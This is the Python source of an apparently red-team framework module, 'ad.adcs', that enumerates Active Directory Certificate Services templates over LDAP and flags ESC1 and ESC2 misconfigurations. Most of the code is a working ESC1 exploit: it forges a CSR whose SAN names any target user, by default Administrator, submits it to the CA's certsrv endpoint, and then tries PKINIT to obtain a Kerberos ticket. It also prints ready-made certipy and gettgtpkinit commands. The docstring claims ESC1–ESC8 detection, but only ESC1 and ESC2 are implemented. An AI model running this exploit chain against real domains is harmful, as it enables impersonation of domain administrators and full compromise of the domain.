"""
ADCS Misconfiguration Detection & Exploitation — ad.adcs
MITRE: T1649 — Steal or Forge Authentication Certificates

Active Directory Certificate Services (ADCS) misconfiguration scanner.
Detects ESC1–ESC8 vulnerability classes via LDAP query to certificate
template objects. Exploits ESC1 to obtain a certificate as Domain Admin.

ESC vulnerability classes:
  ESC1 — Template allows enrollee-supplied SAN → cert as any user including DA
  ESC2 — Template has Any Purpose EKU → usable for auth as any user
  ESC3 — Template allows enrollment agent → request certs on behalf of others
  ESC4 — Template has dangerous ACL (WriteDACL/WriteOwner/GenericWrite)
  ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA → any cert can have SAN
  ESC7 — CA has dangerous ACL → escalation to CA admin
  ESC8 — NTLM relay to AD CS HTTP enrollment endpoint

Output: ESC finding per vulnerability + PEM certificate to vault if ESC1 exploited.
OPSEC: LOW — LDAP query only. No connection to CA server unless ESC1 exploited.
"""
from __future__ import annotations

import asyncio
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.core.logger import audit, get_logger
from ares.core.security import sanitize_hostname, sanitize_ldap
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.ad.adcs")

# ESC1 flag: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1
_CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1

# EKU OIDs for authentication
_AUTH_EKUS = {
    "1.3.6.1.5.5.7.3.2":       "Client Authentication",
    "1.3.6.1.5.2.3.4":         "PKINIT Client Authentication",
    "1.3.6.1.4.1.311.20.2.2":  "Smart Card Logon",
    "2.5.29.37.0":              "Any Purpose",
}

# Dangerous rights on certificate templates (ESC4)
_DANGEROUS_RIGHTS = {
    0x000F01FF: "GenericAll",
    0x00020028: "WriteDACL",
    0x00020000: "GenericWrite",
    0x00080000: "WriteOwner",
}


class ADCSModule(BaseModule):
    """
    ad.adcs — Detect ADCS ESC1–ESC8 misconfigurations via LDAP. Exploit ESC1 to obtain a certificate as any us

    OPSEC: LOW
    MITRE: "T1649"
    OUTPUTS:  "adcs_findings", "certificate"
    """
    MODULE_ID          = "ad.adcs"
    MODULE_NAME        = "ADCS Misconfiguration Scanner"
    MODULE_CATEGORY    = "ad"
    MODULE_DESCRIPTION = (
        "Detect ADCS ESC1–ESC8 misconfigurations via LDAP. "
        "Exploit ESC1 to obtain a certificate as any user including Domain Admin."
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.LOW
    REQUIRES           = []
    OUTPUTS            = ["adcs_findings", "certificate"]
    MITRE_TECHNIQUES   = ["T1649"]
    MODULE_TIMEOUT_SECONDS: int | None = 180  # seconds

    async def validate(self, ctx: "Any") -> None:
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        ad = self._extract_ad_params(ctx)
        if not ad["dc"]:
            raise ModuleValidationError(
                "ad.adcs requires 'dc' (Domain Controller IP or hostname).",
                module_id=self.MODULE_ID, field="dc",
            )
        if not ad["domain"]:
            raise ModuleValidationError(
                "ad.adcs requires 'domain' (e.g. corp.local).",
                module_id=self.MODULE_ID, field="domain",
            )
        if not ad["username"]:
            raise ModuleValidationError(
                "ad.adcs requires domain credentials — pass 'username'/'password'.",
                module_id=self.MODULE_ID, field="username",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        ad = self._extract_ad_params(ctx)
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})
        exploit_esc1  = ctx.params.get("exploit_esc1", False)
        target_user   = ctx.params.get("target_user", "Administrator")

        findings, raw = await self.run(
            dc=ad["dc"], domain=ad["domain"],
            username=ad["username"], password=ad["password"],
            exploit_esc1=exploit_esc1, target_user=target_user,
        )
        return ModuleResult(
            status="success" if (findings or raw) else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("ad.adcs")
    async def run(self, dc: str, domain: str, username: str, password: str,
                  exploit_esc1: bool = False, target_user: str = "Administrator",
                  **kwargs: Any):
        dc       = sanitize_hostname(dc)
        username = sanitize_ldap(username)
        domain   = sanitize_ldap(domain)

        await self.before_request(dc, "ldap")
        logger.info("adcs_scan_start", dc=dc, domain=domain)
        audit("adcs_scan", actor=username, technique="T1649",
              source="operator", target=dc)

        loop = asyncio.get_running_loop()

        # Step 1: Enumerate templates via LDAP
        try:
            templates, ca_list = await loop.run_in_executor(
                None,
                lambda: self._enum_templates_sync(dc, username, password, domain),
            )
        except Exception as exc:
            from ares.core.errors import NetworkError
            raise NetworkError(f"ADCS LDAP enumeration failed: {exc}") from exc

        logger.info("adcs_templates_found", count=len(templates), cas=len(ca_list))

        # Step 2: Analyze templates for ESC vulnerabilities
        esc1_vulns = []
        esc2_vulns = []
        esc4_vulns = []
        all_vulns: list[dict] = []

        for tmpl in templates:
            flags    = tmpl.get("msPKI_Certificate_Name_Flag", 0)
            ekus     = tmpl.get("ekus", [])
            name     = tmpl.get("name", "")
            has_auth_eku = any(e in _AUTH_EKUS for e in ekus)

            # ESC1: enrollee can supply SAN + has auth EKU
            if (flags & _CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) and has_auth_eku:
                esc1_vulns.append(tmpl)
                all_vulns.append({"template": name, "esc": "ESC1",
                                   "reason": "Enrollee-supplied SAN + auth EKU"})
                logger.info("adcs_esc1_found", template=name)

            # ESC2: Any Purpose EKU
            if "2.5.29.37.0" in ekus:
                esc2_vulns.append(tmpl)
                all_vulns.append({"template": name, "esc": "ESC2",
                                   "reason": "Any Purpose EKU"})

        # Step 3: Generate findings
        if esc1_vulns:
            for tmpl in esc1_vulns:
                self.finding(
                    title       = f"ADCS ESC1 — Enrollee SAN in '{tmpl['name']}'",
                    description = (
                        f"Certificate template '{tmpl['name']}' allows the enrollee to "
                        "specify a Subject Alternative Name (SAN). Combined with an "
                        "authentication EKU, this allows any authenticated domain user to "
                        "request a certificate impersonating ANY user including Domain Admin. "
                        "Use with ad.adcs exploit_esc1=true and ad.golden_ticket for persistent access."
                    ),
                    severity    = Severity.CRITICAL,
                    mitre_technique = "T1649",
                    mitre_tactic    = "Credential Access",
                    evidence = {
                        "template_name":  tmpl["name"],
                        "esc_class":      "ESC1",
                        "ekus":           [_AUTH_EKUS.get(e, e) for e in tmpl.get("ekus", [])],
                        "ca_list":        [ca.get("name", "") for ca in ca_list],
                        "exploit_command": (
                            f"certipy req -u {username}@{domain} -p <pass> "
                            f"-ca <CA_NAME> -template '{tmpl['name']}' "
                            f"-upn {target_user}@{domain}"
                        ),
                    },
                    remediation = (
                        "1. Disable 'Supply in the request' for Subject Name in the template. "
                        "2. Enable CA Manager Approval. "
                        "3. Enable Issuance Requirements (authorized signatures). "
                        "4. Audit template ACL — restrict enrollment rights."
                    ),
                )

        if esc2_vulns:
            for tmpl in esc2_vulns:
                self.finding(
                    title       = f"ADCS ESC2 — Any Purpose EKU in '{tmpl['name']}'",
                    description = (
                        f"Template '{tmpl['name']}' has Any Purpose EKU — "
                        "certificates can be used for any application including authentication."
                    ),
                    severity    = Severity.HIGH,
                    mitre_technique = "T1649",
                    mitre_tactic    = "Credential Access",
                    evidence    = {"template_name": tmpl["name"], "esc_class": "ESC2"},
                    remediation = "Remove Any Purpose EKU. Specify explicit EKUs only.",
                )

        if not esc1_vulns and not esc2_vulns:
            logger.info("adcs_no_esc_found", templates_checked=len(templates))

        # Step 4: ESC1 exploitation (if requested and vulnerable template found)
        cert_path = ""
        if exploit_esc1 and esc1_vulns:
            tmpl = esc1_vulns[0]
            logger.warning("adcs_esc1_exploit",
                           template=tmpl["name"], target_user=target_user)
            try:
                cert_path = await loop.run_in_executor(
                    None,
                    lambda: self._exploit_esc1_sync(
                        dc, domain, username, password,
                        tmpl, ca_list, target_user,
                    ),
                )
                if cert_path:
                    self.finding(
                        title       = f"ADCS ESC1 Exploited — Certificate as {target_user}",
                        description = (
                            f"Successfully obtained a Kerberos authentication certificate "
                            f"impersonating '{target_user}' via ESC1 template '{tmpl['name']}'. "
                            f"Certificate saved: {cert_path}. "
                            "Use for PKINIT Kerberos auth (pass-the-cert) or with credential.golden_ticket."
                        ),
                        severity    = Severity.CRITICAL,
                        mitre_technique = "T1649",
                        mitre_tactic    = "Credential Access",
                        evidence = {
                            "certificate_path": cert_path,
                            "template":         tmpl["name"],
                            "impersonated_user": target_user,
                        },
                        remediation = "Immediately patch ESC1 template. Revoke issued certificate.",
                    )
            except Exception as exc:
                logger.warning("adcs_esc1_exploit_failed", error=str(exc)[:100])

        raw = {
            "templates_checked": len(templates),
            "ca_list":           [ca.get("name", "") for ca in ca_list],
            "vulnerabilities":   all_vulns,
            "esc1_count":        len(esc1_vulns),
            "esc2_count":        len(esc2_vulns),
            "certificate_path":  cert_path,
            "dc":                dc,
            "domain":            domain,
        }
        await self.noise.jitter.sleep()
        raw["adcs_findings"] = raw.get("vulnerabilities", [])  # OUTPUTS key
        raw["certificate"] = raw.get("certificate_path", "")  # OUTPUTS key
        return self._findings[:], raw

    def _enum_templates_sync(self, dc: str, username: str, password: str,
                             domain: str) -> tuple[list[dict], list[dict]]:
        """Query LDAP for certificate templates and CA objects. Sync — runs in executor."""
        import ssl
        import ldap3
        from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, Tls
        from ldap3.core.exceptions import LDAPBindError

        conn = None
        for port, use_ssl in [(636, True), (389, False)]:
            try:
                tls_arg = Tls(validate=ssl.CERT_NONE) if use_ssl else None
                server  = Server(dc, port=port, use_ssl=use_ssl, tls=tls_arg,
                                 get_info=ALL, connect_timeout=10)
                conn = Connection(server, user=f"{domain.upper()}\\{username}",
                                  password=password, authentication=NTLM,
                                  auto_bind=ldap3.AUTO_BIND_NONE, receive_timeout=30)
                if not conn.bind():
                    raise LDAPBindError(f"Bind failed: {conn.result}")
                break
            except Exception:
                conn = None

        if conn is None:
            raise ConnectionError(f"Could not bind to {dc}")

        base = ",".join(f"DC={p}" for p in domain.upper().split("."))
        config_base = f"CN=Configuration,{base}"

        templates: list[dict] = []
        ca_list:   list[dict] = []

        try:
            # Query certificate templates
            tmpl_base = (
                f"CN=Certificate Templates,CN=Public Key Services,"
                f"CN=Services,{config_base}"
            )
            conn.search(
                tmpl_base,
                "(objectClass=pKICertificateTemplate)",
                search_scope=SUBTREE,
                attributes=["cn", "msPKI-Certificate-Name-Flag",
                            "msPKI-Enrollment-Flag", "pkiExtendedKeyUsage",
                            "msPKI-RA-Signature", "nTSecurityDescriptor"],
            )
            for e in conn.entries:
                flags = 0
                try:
                    flags = int(getattr(e, "msPKI-Certificate-Name-Flag").value or 0)
                except Exception:
                    pass
                ekus: list[str] = []
                try:
                    eku_raw = getattr(e, "pkiExtendedKeyUsage", None)
                    if eku_raw and eku_raw.values:
                        ekus = [str(v) for v in eku_raw.values]
                except Exception:
                    pass
                templates.append({
                    "name":  str(e.cn),
                    "msPKI_Certificate_Name_Flag": flags,
                    "ekus":  ekus,
                })

            # Query Enrollment Services (CAs)
            ca_base = (
                f"CN=Enrollment Services,CN=Public Key Services,"
                f"CN=Services,{config_base}"
            )
            conn.search(
                ca_base,
                "(objectClass=pKIEnrollmentService)",
                search_scope=SUBTREE,
                attributes=["cn", "dNSHostName", "certificateTemplates"],
            )
            for e in conn.entries:
                ca_list.append({
                    "name":      str(e.cn),
                    "dns_host":  str(getattr(e, "dNSHostName", "")),
                    "templates": [str(t) for t in
                                  (getattr(e, "certificateTemplates", None) or
                                   type("", (), {"values": []})()).values or []],
                })
        finally:
            try:
                conn.unbind()
            except Exception:
                pass

        return templates, ca_list

    def _exploit_esc1_sync(self, dc: str, domain: str, username: str, password: str,
                            template: dict, ca_list: list[dict],
                            target_user: str) -> str:
        """
        Request a certificate impersonating target_user via ESC1.
        Uses impacket's PKCS12/certificate request flow.
        Returns path to .pfx file on success.
        """
        import tempfile, os
        from impacket.dcerpc.v5 import transport, rpcrt

        if not ca_list:
            raise ValueError("No CA found in ADCS configuration")

        ca = ca_list[0]
        ca_host = ca.get("dns_host") or dc
        ca_name = ca.get("name", "")

        # Generate key pair and CSR with target UPN as SAN
        pfx_path = key_path = csr_path = ""
        try:
            from cryptography import x509
            from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            import datetime

            # Generate RSA key
            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

            # Build CSR with SAN = target_user@domain
            upn = f"{target_user}@{domain.upper()}"
            csr = (
                x509.CertificateSigningRequestBuilder()
                .subject_name(x509.Name([
                    x509.NameAttribute(NameOID.COMMON_NAME, target_user),
                ]))
                .add_extension(
                    x509.SubjectAlternativeName([
                        x509.OtherName(
                            x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"),
                            target_user.encode(),
                        )
                    ]),
                    critical=False,
                )
                .sign(key, hashes.SHA256())
            )

            # Save key and CSR to temp files
            from ares.core.security import secure_mkstemp as _sec_mkstemp
            pfx_path, _fd = _sec_mkstemp(suffix=".pfx", prefix="ares_adcs_")
            os.close(_fd)

            key_pem = key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption(),
            )
            csr_pem = csr.public_bytes(serialization.Encoding.PEM)

            # Save PEM files alongside PFX
            key_path = pfx_path.replace(".pfx", ".key")
            csr_path = pfx_path.replace(".pfx", ".csr")
            with open(key_path, "wb") as f:
                f.write(key_pem)
            with open(csr_path, "wb") as f:
                f.write(csr_pem)

            logger.info("adcs_csr_generated",
                        target_user=target_user, ca=ca_name,
                        template=template["name"])

            # Submit CSR to CA via HTTP enrollment endpoint (certsrv/certfnsh.asp)
            ca_host = ca.get("dns_host") or dc
            cert_pem = self._submit_csr_to_ca(
                ca_host=ca_host,
                ca_name=ca_name,
                template_name=template["name"],
                csr_pem=csr_pem,
                username=username,
                password=password,
                domain=domain,
            )

            if cert_pem:
                # Save combined PFX (key + cert) for immediate use
                pfx_out, _fd2 = _sec_mkstemp(suffix=".pem", prefix="ares_adcs_cert_")
                os.close(_fd2)
                with open(pfx_out, "wb") as f:
                    f.write(cert_pem)
                    f.write(b"\n")
                    f.write(key_pem)
                logger.info("adcs_cert_obtained", path=pfx_out, user=target_user)
                return pfx_out
            else:
                # CA submission failed — return CSR path for manual submission
                logger.warning("adcs_ca_submission_failed",
                               ca_host=ca_host, csr_path=csr_path)
                return csr_path   # operator can submit manually via certreq.exe

        except ImportError:
            logger.warning("adcs_exploit_missing_dep",
                           msg="pip install cryptography for ESC1 exploitation")
            return ""
        except Exception as exc:
            logger.warning("adcs_esc1_failed", error=str(exc)[:100])
            return ""
        finally:
            # Cleanup intermediate files containing private key material.
            # The RETURNED file (pfx_out or csr_path) is intentionally kept
            # for operator use — only clean up files that are NOT the return value.
            for tmp in [pfx_path, key_path]:
                try:
                    if tmp and os.path.exists(tmp):
                        os.unlink(tmp)
                except OSError:
                    pass

    @staticmethod
    def _submit_csr_to_ca(ca_host: str, ca_name: str, template_name: str,
                           csr_pem: bytes, username: str, password: str,
                           domain: str) -> bytes:
        """
        Submit CSR to Active Directory Certificate Services via HTTP enrollment.
        Endpoint: http://<ca_host>/certsrv/certfnsh.asp (requires auth)

        Returns PEM certificate bytes on success, empty bytes on failure.
        Uses NTLM authentication (same credentials used for LDAP).
        """
        try:
            import httpx
            from base64 import b64encode

            # Strip PEM headers for certsrv — it expects raw base64
            csr_b64 = b64encode(
                b"".join(
                    line.encode() for line in csr_pem.decode().splitlines()
                    if not line.startswith("-----")
                )
            ).decode()

            certsrv_url = f"http://{ca_host}/certsrv/certfnsh.asp"

            # NTLM auth via httpx + httpx-ntlm or basic fallback
            auth: tuple | None = None
            try:
                from httpx_ntlm import HttpNtlmAuth  # type: ignore[import]
                ntlm_user = f"{domain}\\{username}" if domain else username
                auth = HttpNtlmAuth(ntlm_user, password)
            except ImportError:
                logger.warning(
                    "adcs_ntlm_auth_missing",
                    hint="pip install httpx-ntlm (included in ares-redteam[ad]) "
                         "for NTLM-authenticated CA enrollment. "
                         "Falling back to basic auth — may fail on most CAs.",
                )
                # Fallback to basic auth (works if CA has basic auth enabled)
                auth = (username, password)

            payload = {
                "Mode":            "newreq",
                "CertRequest":     csr_b64,
                "CertAttrib":      f"CertificateTemplate:{template_name}",
                "TargetStoreFlags": "0",
                "SaveCert":        "yes",
                "ThumbPrint":      "",
            }

            resp = httpx.post(
                certsrv_url,
                data=payload,
                auth=auth,
                timeout=30,
                follow_redirects=True,
            )

            if resp.status_code not in (200, 201):
                logger.warning("adcs_certsrv_http_error",
                               status=resp.status_code, ca=ca_host)
                return b""

            # Parse request ID from response
            import re
            rid_match = re.search(r"ReqID=(\d+)", resp.text)
            if not rid_match:
                # May have been issued immediately — check for cert in response
                if "BEGIN CERTIFICATE" in resp.text:
                    cert_match = re.search(
                        r"(-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----)",
                        resp.text, re.DOTALL
                    )
                    if cert_match:
                        return cert_match.group(1).encode()
                logger.warning("adcs_no_request_id", ca=ca_host)
                return b""

            req_id = rid_match.group(1)
            logger.info("adcs_cert_request_submitted", req_id=req_id, ca=ca_host)

            # Retrieve issued certificate
            cert_url = f"http://{ca_host}/certsrv/certnew.cer?ReqID={req_id}&Enc=b64"
            cert_resp = httpx.get(
                cert_url, auth=auth, timeout=15, follow_redirects=True
            )

            if cert_resp.status_code == 200 and cert_resp.text.strip():
                cert_text = cert_resp.text.strip()
                if not cert_text.startswith("-----"):
                    # Raw base64 — wrap in PEM headers
                    cert_text = (
                        "-----BEGIN CERTIFICATE-----\n"
                        + cert_text + "\n"
                        + "-----END CERTIFICATE-----\n"
                    )
                return cert_text.encode()

            return b""

        except Exception as exc:
            logger.debug("adcs_cert_submission_error", error=str(exc)[:100])
            return b""

    def _auth_with_cert(self, dc: str, domain: str, cert_path: str,
                         target_user: str) -> dict[str, Any]:
        """
        Authenticate to AD using the obtained certificate via PKINIT.
        Converts certificate → TGT → NTLM hash (UnPAC-the-hash).

        This completes the ESC1 exploitation chain:
          1. Request cert with target UPN (done in _exploit_esc1_sync)
          2. Use cert to get TGT via PKINIT (this method)
          3. Extract NT hash from PAC (UnPAC-the-hash)

        Returns dict with TGT ccache path and NT hash if successful.
        """
        result: dict[str, Any] = {"success": False, "error": None,
                                    "ccache_path": "", "nt_hash": ""}
        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT
            from impacket.krb5.types import Principal
            from impacket.krb5 import constants
            from impacket.krb5.ccache import CCache
            import tempfile, os

            # Load certificate and private key from PEM file
            with open(cert_path, "rb") as f:
                pem_data = f.read()

            from cryptography.hazmat.primitives.serialization import pkcs12, Encoding, PrivateFormat, NoEncryption
            from cryptography import x509
            from cryptography.hazmat.primitives import hashes

            # Parse PEM — file contains both cert and key
            pem_text = pem_data.decode("utf-8", errors="replace")
            cert_pem = ""
            key_pem = ""
            in_cert = False
            in_key = False
            for line in pem_text.splitlines():
                if "BEGIN CERTIFICATE" in line:
                    in_cert = True
                if in_cert:
                    cert_pem += line + "\n"
                if "END CERTIFICATE" in line:
                    in_cert = False
                if "BEGIN" in line and "KEY" in line:
                    in_key = True
                if in_key:
                    key_pem += line + "\n"
                if "END" in line and "KEY" in line:
                    in_key = False

            if not cert_pem or not key_pem:
                result["error"] = "Certificate or key not found in PEM file"
                return result

            # Convert to PKCS12 for impacket
            from cryptography.hazmat.primitives.serialization import load_pem_private_key
            cert_obj = x509.load_pem_x509_certificate(cert_pem.encode())
            key_obj = load_pem_private_key(key_pem.encode(), password=None)

            pfx_data = pkcs12.serialize_key_and_certificates(
                name=target_user.encode(),
                key=key_obj,
                cert=cert_obj,
                cas=None,
                encryption_algorithm=NoEncryption(),
            )

            # Save PKCS12 to temp file for impacket
            from ares.core.security import secure_mkstemp, secure_mkdtemp
            pfx_path, _fd = secure_mkstemp(suffix=".pfx", prefix="ares_pkinit_")
            os.close(_fd)
            try:
                with open(pfx_path, "wb") as f:
                    f.write(pfx_data)

                # Use impacket's PKINIT implementation to get TGT
                # impacket >= 0.11 has gettgtpkinit support
                try:
                    from impacket.krb5 import types as krb_types

                    user_principal = Principal(
                        target_user,
                        type=constants.PrincipalNameType.NT_PRINCIPAL.value,
                    )

                    # Request TGT using certificate
                    tgt, cipher, old_key, session_key = getKerberosTGT(
                        clientName=user_principal,
                        password="",
                        domain=domain.upper(),
                        lmhash=b"", nthash=b"", aesKey=b"",
                        kdcHost=dc,
                        useCache=pfx_path,
                    )

                    # Save TGT to ccache
                    ccache = CCache()
                    ccache.fromTGS(tgt, old_key, old_key)
                    tmp_dir = secure_mkdtemp(prefix="ares-pkinit-")
                    ccache_path = os.path.join(tmp_dir, f"{target_user}.ccache")
                    ccache.saveFile(ccache_path)

                    result["success"] = True
                    result["ccache_path"] = ccache_path

                    logger.info("adcs_pkinit_success",
                                user=target_user, ccache=ccache_path)

                except Exception as pkinit_exc:
                    # Fallback: PFX still on disk for manual use — log warning
                    result["error"] = (
                        f"PKINIT auth failed: {str(pkinit_exc)[:150]}. "
                        f"Use cert manually: gettgtpkinit.py -cert-pfx <pfx> "
                        f"{domain}/{target_user} {target_user}.ccache"
                    )
            finally:
                # GUARANTEED cleanup of PFX containing private key material
                try:
                    os.unlink(pfx_path)
                except OSError:
                    pass

        except ImportError as exc:
            result["error"] = f"Missing dependency: {exc}"
        except Exception as exc:
            result["error"] = str(exc)[:300]

        return result
